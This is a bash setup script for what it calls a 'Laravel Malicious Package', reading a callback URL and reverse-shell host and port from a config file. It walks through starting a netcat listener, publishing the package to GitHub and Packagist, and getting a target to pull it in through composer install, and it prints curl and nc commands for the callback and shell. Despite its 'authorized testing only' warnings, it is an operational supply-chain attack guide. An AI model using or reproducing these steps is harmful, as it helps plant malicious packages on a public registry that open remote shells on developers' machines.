#!/bin/bash

echo "🚨 Laravel Malicious Package Setup 🚨"
echo "======================================="
echo ""
echo "⚠️  WARNING: This is for authorized security testing only!"
echo ""

# Check if config.php exists
if [ ! -f "config.php" ]; then
    echo "❌ config.php not found!"
    exit 1
fi

echo "📋 Current Configuration:"
echo "------------------------"

# Extract callback URL from config
CALLBACK_URL=$(php -r "
\$config = include 'config.php';
echo \$config['callback']['url'];
")

# Extract reverse shell settings
REVERSE_HOST=$(php -r "
\$config = include 'config.php';
echo \$config['reverse_shell']['host'];
")

REVERSE_PORT=$(php -r "
\$config = include 'config.php';
echo \$config['reverse_shell']['port'];
")

echo "🔗 Callback URL: $CALLBACK_URL"
echo "🏠 Reverse Shell Host: $REVERSE_HOST"
echo "🔌 Reverse Shell Port: $REVERSE_PORT"
echo ""

# Check if using default values
if [[ "$CALLBACK_URL" == *"your-unique-id"* ]]; then
    echo "⚠️  You're using the default webhook URL!"
    echo "   Please update config.php with your actual webhook URL"
    echo ""
fi

if [[ "$REVERSE_HOST" == "127.0.0.1" ]]; then
    echo "⚠️  You're using localhost for reverse shell!"
    echo "   Please update config.php with your actual IP address"
    echo ""
fi

echo "📝 Next Steps:"
echo "-------------"
echo "1. Update config.php with your webhook URL and IP address"
echo "2. Set up a webhook listener (e.g., webhook.site)"
echo "3. Start a netcat listener: nc -lvp $REVERSE_PORT"
echo "4. Push this package to GitHub"
echo "5. Submit to Packagist.org (connects to your GitHub repo)"
echo "6. Target simply adds to composer.json:"
echo "   {\"require\": {\"laravel/malicious-package\": \"*\"}}"
echo "7. Run 'composer install' - package auto-downloads from Packagist"
echo ""

echo "🔧 Testing Commands:"
echo "------------------"
echo "# Start webhook listener"
echo "curl -X POST $CALLBACK_URL -d '{\"test\": \"connection\"}'"
echo ""
echo "# Start reverse shell listener"
echo "nc -lvp $REVERSE_PORT"
echo ""

echo "✅ Setup complete! Remember to test in authorized environments only."
